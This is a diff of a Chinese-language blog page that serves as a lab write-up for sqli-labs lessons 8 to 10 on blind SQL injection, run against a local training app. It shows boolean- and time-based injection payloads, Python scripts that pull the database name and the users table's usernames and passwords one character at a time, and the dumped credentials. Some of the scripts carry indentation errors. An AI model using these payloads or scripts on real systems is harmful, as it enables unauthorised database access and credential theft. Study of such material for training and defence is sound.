@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Lilin">
 <meta property="og:description" content="LESS 8 基于布尔的盲注盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为好几种，本关采用基于布尔的盲注 盲注相关函数：  mid(column_name,start[,length])   123456 select mid(12345,2,3);+----------------+| m">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-28T16:03:55.545Z">
+<meta property="og:updated_time" content="2018-05-29T13:37:50.850Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs less8-10">
 <meta name="twitter:description" content="LESS 8 基于布尔的盲注盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注分为好几种，本关采用基于布尔的盲注 盲注相关函数：  mid(column_name,start[,length])   123456 select mid(12345,2,3);+----------------+| m">
@@ -201,6 +201,16 @@
         </li>
       
         
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
@@ -248,7 +258,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lilin">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/avatar.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -282,6 +292,39 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -341,14 +384,30 @@
 <li>返回字符串的长度</li>
 </ul>
 </li>
-<li>if(express,a,b)<br>  -如果express代表的表达式成立，则返回a，否则返回b</li>
 </ul>
+<a id="more"></a>
 <p>回到本关，先输入单引号和双引号进行测试，发现单引号没有返回信息，于是判断参数是被单引号包围,构造payload测试数据库名的第一个字符:</p>
 <blockquote>
 <p><a href="http://localhost/sqli-labs-master/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-8/?id=1&#39;</a> and ascii(substr(database(),1))=1%23</p>
 </blockquote>
-<p>无返回结果，由于测试量较大，使用脚本测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =  <span class="string">"http://localhost/sqli-labs-master/Less-8/?id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">length</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"查询数据库名的长度"</span></span><br><span class="line">    length =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#构造动态参数并用quote函数进行url编码</span></span><br><span class="line">        param =  <span class="string">"1' and length(database())="</span>+str(length)+<span class="string">"#"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        <span class="comment">#匹配成功代表长度正确</span></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">        <span class="comment">#失败则加1继续循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            length +=  <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">database</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"查询数据库名"</span></span><br><span class="line">    dbname =  <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span>  range(length()):</span><br><span class="line">    <span class="comment">#对128个ascii码值进行遍历并构造动态参数</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span>  range(<span class="number">128</span>):</span><br><span class="line">            param =  <span class="string">"1' and ascii(substr(database(),"</span>  +  str(n+<span class="number">1</span>) +  <span class="string">"))="</span>  +  str(a) +  <span class="string">"#"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                dbname = dbname +  chr(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line">    </span><br><span class="line">print(database())</span><br></pre></td></tr></table></figure></p>
-<p>输出结果为security<br>对于函数database()也可以采用时间复杂度更低的二分法</p>
+<p>无返回结果，对数据库名的每一个字符都作类似的测试，由于测试量较大，使用脚本来完成测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url =  <span class="string">"http://localhost/sqli-labs-master/Less-8/?id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">length</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"查询数据库名的长度"</span></span><br><span class="line">    length =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>  <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#构造动态参数并用quote函数进行url编码</span></span><br><span class="line">        param =  <span class="string">"1' and length(database())="</span>+str(length)+<span class="string">"#"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        <span class="comment">#匹配成功代表长度正确</span></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">        <span class="comment">#失败则加1继续循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            length +=  <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">database</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"查询数据库名"</span></span><br><span class="line">    dbname =  <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span>  range(length()):</span><br><span class="line">    <span class="comment">#对128个ascii码值进行遍历并构造动态参数</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span>  range(<span class="number">128</span>):</span><br><span class="line">            param =  <span class="string">"1' and ascii(substr(database(),"</span>  +  str(n+<span class="number">1</span>) +  <span class="string">"))="</span>  +  str(a) +  <span class="string">"#"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                dbname = dbname +  chr(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line">    </span><br><span class="line">print(database())</span><br></pre></td></tr></table></figure></p>
+<p>输出结果为security<br>对于函数database()可以采用时间复杂度更低的二分法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">database</span><span class="params">()</span>:</span></span><br><span class="line"><span class="string">"查询数据库名"</span></span><br><span class="line">    dbname =  <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span>  range(length()):</span><br><span class="line">        a, b =  <span class="number">64</span>, <span class="number">64</span></span><br><span class="line">        <span class="comment">#使用二分法构造动态参数</span></span><br><span class="line">        <span class="keyword">while</span>  <span class="keyword">True</span>:</span><br><span class="line">            b =  int(b/<span class="number">2</span>)</span><br><span class="line">            param =  <span class="string">"1' and ascii(substr(database(),"</span>  +  str(n+<span class="number">1</span>) +  <span class="string">"))&lt;"</span>  +  str(a) +  <span class="string">"#"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                a -= b</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                param =  <span class="string">"1' and ascii(substr(database(),"</span>  +  str(n+<span class="number">1</span>) +  <span class="string">"))="</span>  +  str(a) +  <span class="string">"#"</span></span><br><span class="line">                response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                    dbname = dbname +  chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                a += b</span><br><span class="line">    <span class="keyword">return</span> dbname</span><br></pre></td></tr></table></figure></p>
+<p>速度噌的就提上去了，数据结构果然还是要学好<br>之后我对之前的脚本做了一些修改，使其支持参数化查询，最终的盲注脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs-master/Less-8/?id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="string">"查询数据库名的长度"</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#构造动态参数并用quote函数进行url编码</span></span><br><span class="line">        param = <span class="string">"1' and length("</span> + value + <span class="string">")="</span>+str(length)+<span class="string">"#"</span></span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        <span class="comment">#匹配成功代表长度正确</span></span><br><span class="line">        <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">        <span class="comment">#失败则加1继续循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="string">"查询数据库名"</span></span><br><span class="line">    dbname = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(getLength(value)):</span><br><span class="line">        a = <span class="number">64</span></span><br><span class="line">        b = <span class="number">64</span></span><br><span class="line">        <span class="comment">#使用二分法构造动态参数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            b = int(b/<span class="number">2</span>)</span><br><span class="line">            param = <span class="string">"1' and ascii(substr("</span> + value + <span class="string">","</span> + str(n+<span class="number">1</span>) + <span class="string">"))&lt;"</span> + str(a) + <span class="string">"#"</span></span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                a -= b</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                param = <span class="string">"1' and ascii(substr("</span> + value + <span class="string">","</span> + str(n+<span class="number">1</span>) + <span class="string">"))="</span> + str(a) + <span class="string">"#"</span></span><br><span class="line">                response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">                <span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>, response)):</span><br><span class="line">                    dbname = dbname + chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    a += b</span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line"></span><br><span class="line">print(getName(<span class="string">"(select group_concat(username) from users)"</span>))</span><br><span class="line">print(getName(<span class="string">"(select group_concat(password) from users)"</span>))</span><br></pre></td></tr></table></figure></p>
+<p>输出如下，注入成功：</p>
+<blockquote>
+<p>Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
+</blockquote>
+<h1 id="LESS-9-基于时间的盲注"><a href="#LESS-9-基于时间的盲注" class="headerlink" title="LESS 9 基于时间的盲注"></a>LESS 9 基于时间的盲注</h1><p>和上一关不同，第八关只要没有查询到就不会显示“You are in………..”,而本关只要id是有值的就会显示“You are in………..”，没有办法通过页面显示的结果来进行盲注，所以要用到一个特殊的函数sleep(),语法如下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(seconds)        #函数功能即执行延迟seconds秒</span><br></pre></td></tr></table></figure></p>
+<p>还要用到的一个函数<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(condition, a, b)        #如果condition成立，则返回a，否则返回b</span><br></pre></td></tr></table></figure></p>
+<p>举个栗子，在本关中构造这样一个payload:</p>
+<blockquote>
+<p><a href="http://localhost/sqli-labs-master/Less-9/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-9/?id=1&#39;</a> and if(1=1,sleep(3),1)%23</p>
+</blockquote>
+<p>在if函数中，因为1=1当然是成立的，所以执行sleep(3)，所以你会看到网页内容大概在3s后才显示出来，如果表达式不成立，网页就会立即显示出来，而1=1的位置则可以放各种表达式</p>
+<p>于是，把上一关的脚本稍微改一下就成了本关的盲注脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs-master/Less-9/?id="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="string">"查询value长度"</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment">#构造动态参数并用quote函数进行url编码</span></span><br><span class="line">        param = <span class="string">"1' and if(length("</span>+value+<span class="string">")="</span>+str(length)+<span class="string">",sleep(0.1),1)#"</span></span><br><span class="line">        t = time()      <span class="comment">#time函数获取当前时间戳</span></span><br><span class="line">        request.urlopen(url + parse.quote(param))</span><br><span class="line">        <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):        <span class="comment">#时间间隔大于0.1代表长度正确</span></span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">        <span class="keyword">else</span>:       <span class="comment">#失败则加1继续循环</span></span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(value)</span>:</span></span><br><span class="line">    <span class="string">"查询value名"</span></span><br><span class="line">    dbname = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(getLength(value)):</span><br><span class="line">        a = <span class="number">64</span></span><br><span class="line">        b = <span class="number">64</span></span><br><span class="line">        <span class="comment">#使用二分法构造动态参数</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            b = int(b/<span class="number">2</span>)</span><br><span class="line">            param = <span class="string">"1' and if(ascii(substr("</span>+value+<span class="string">","</span>+str(n+<span class="number">1</span>)+<span class="string">"))&lt;"</span>+str(a)+<span class="string">",sleep(0.1),1)#"</span></span><br><span class="line">            t = time()</span><br><span class="line">            request.urlopen(url + parse.quote(param))</span><br><span class="line">            <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">                a -= b</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                param = <span class="string">"1' and if(ascii(substr("</span>+value+<span class="string">","</span>+str(n+<span class="number">1</span>)+<span class="string">"))="</span>+str(a)+<span class="string">",sleep(0.1),1)#"</span></span><br><span class="line">                t = time()</span><br><span class="line">                request.urlopen(url + parse.quote(param))</span><br><span class="line">                <span class="keyword">if</span> (time() - t &gt; <span class="number">0.1</span>):</span><br><span class="line">                    dbname = dbname + chr(a)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    a += b</span><br><span class="line">    <span class="keyword">return</span> dbname</span><br><span class="line">    </span><br><span class="line">print(getName(<span class="string">"(select group_concat(username) from users)"</span>))</span><br><span class="line">print(getName(<span class="string">"(select group_concat(password) from users)"</span>))</span><br></pre></td></tr></table></figure></p>
+<p>结果和上一关是一样的</p>
+<h1 id="LESS-10-基于时间的盲注（双引号）"><a href="#LESS-10-基于时间的盲注（双引号）" class="headerlink" title="LESS 10 基于时间的盲注（双引号）"></a>LESS 10 基于时间的盲注（双引号）</h1><p>题如其名，只要把上一关绕过用的单引号改成双引号就可以盲注成功，这一关源程序和上一关应该就只是单引号双引号的区别而已</p>
+<p>脚本请参照第九关</p>
 
       
     </div>
@@ -379,7 +438,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/28/sqli-lin/" rel="next" title="sqli-labs less2-7">
+              <a href="/2018/05/28/sqli-labs less2-7/" rel="next" title="sqli-labs less2-7">
                 <i class="fa fa-chevron-left"></i> sqli-labs less2-7
               </a>
             
@@ -388,6 +447,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/29/sqli-labs-less11/" rel="prev" title="sqli-labs less11">
+                sqli-labs less11 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -453,6 +516,10 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
+              <img class="site-author-image" itemprop="image"
+                src="/avatar.jpg"
+                alt="Lilin" />
+            
               <p class="site-author-name" itemprop="name">Lilin</p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
@@ -464,12 +531,21 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
             
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
             
 
             
@@ -526,7 +602,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-8-基于布尔的盲注"><span class="nav-number">1.</span> <span class="nav-text">LESS 8 基于布尔的盲注</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-8-基于布尔的盲注"><span class="nav-number">1.</span> <span class="nav-text">LESS 8 基于布尔的盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-9-基于时间的盲注"><span class="nav-number">2.</span> <span class="nav-text">LESS 9 基于时间的盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LESS-10-基于时间的盲注（双引号）"><span class="nav-number">3.</span> <span class="nav-text">LESS 10 基于时间的盲注（双引号）</span></a></li></ol></div>
             
 
           </div>
